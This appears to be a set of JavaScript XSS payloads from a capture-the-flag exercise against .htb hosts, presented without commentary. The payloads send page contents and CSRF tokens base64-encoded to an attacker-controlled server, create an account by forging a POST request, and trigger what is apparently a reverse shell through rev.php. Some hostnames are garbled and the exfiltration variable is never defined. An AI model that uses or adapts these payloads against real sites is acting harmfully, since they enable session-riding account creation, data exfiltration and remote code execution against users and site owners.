
me = 'http://localhost/'

username = 'xzxvzxvcz'
password = 'zxcvzxvzxcvzxcvzxvzcvx'

req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
        req2 = new XMLHttpRequest;
        req2.open('GET', myhttpserver + btoa(this.responseText), false);
        req2.send()
    }
}
req.open('GET', "http://ftp.fasfffdf==xasndffst.htb/accounts/create", false);
req.send();
rx = /token" value="(.*)"/g;
token = rx.exec(req.responseText)[1];

var params = '_token=' + token + '&username=' + username + '&pass=' + password + '&submit=submit';
req.open('POST', "http://ftp.asdfnksdfnksdfandf.htb/accounts", false);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.send(params);


#######################################################

req = new XMLHttpRequest;
req.open('GET', "http://development-test.xxxxxxxxxx.htb/rev.php");
req.send();


#######################################################

me = 'http://localhost/'
targeturl = 'http://ftp.sfdasdnfksndfskdfnf.htb/accounts/create'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
    req2 = new XMLHttpRequest;
    req2.open('GET', myhttpserver + btoa(this.responseText), false);
    req2.send();
    }
}
req.open('GET', targeturl, false);
req.send();

#######################################################
